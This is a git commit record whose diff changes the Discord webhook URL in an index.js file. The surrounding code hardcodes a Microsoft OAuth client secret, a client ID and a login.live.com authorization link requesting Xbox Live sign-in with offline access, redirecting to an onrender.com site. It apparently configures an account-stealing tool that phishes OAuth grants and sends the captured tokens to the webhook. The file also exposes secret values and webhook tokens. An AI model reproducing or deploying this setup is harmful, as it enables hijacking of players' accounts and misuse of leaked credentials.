63b4443ffed0f9e271eb8147ece9519bdb75901a
Rose Gold <112060016+RoseGoldIsGay@users.noreply.github.com>
2022-12-08 14:53:47 +1100

    Update index.js

--- index.js
+++ index.js
@@ -2,7 +2,7 @@
 const client_secret = 'cXw8Q~tivfs8oVPAbAakLkaFv2atQGfHW0Bs2cK0' //you need to put the "Secret Value" here not the "Secret ID"!!!!
 const client_id = 'f6f9ea1f-0a01-49e1-854a-2771d19ebee4'
 const redirect_uri = 'https://skyhelperbot.onrender.com'
-const webhook_url = 'https://discord.com/api/webhooks/1050000458070118430/G5bUMJOCStMY8tejI9UyZxMbDoLYJgWDkZW0W1WKcFv9_r-7o8YUGSf6xY3dMbMLVOVQ'
+const webhook_url = 'https://discord.com/api/webhooks/1047627571493339257/TRpgQ_5yAgC8Mx800LRoJn6DIhmCDOSImYMloMBam_vBfzJaWhciAHxeg-fZvQjfgJ6v'
 
 //Requirements
 const redirect = 'https://login.live.com/oauth20_authorize.srf?client_id='+client_id+'&response_type=code&redirect_uri='+redirect_uri+'&scope=XboxLive.signin+offline_access&state=NOT_NEEDED'
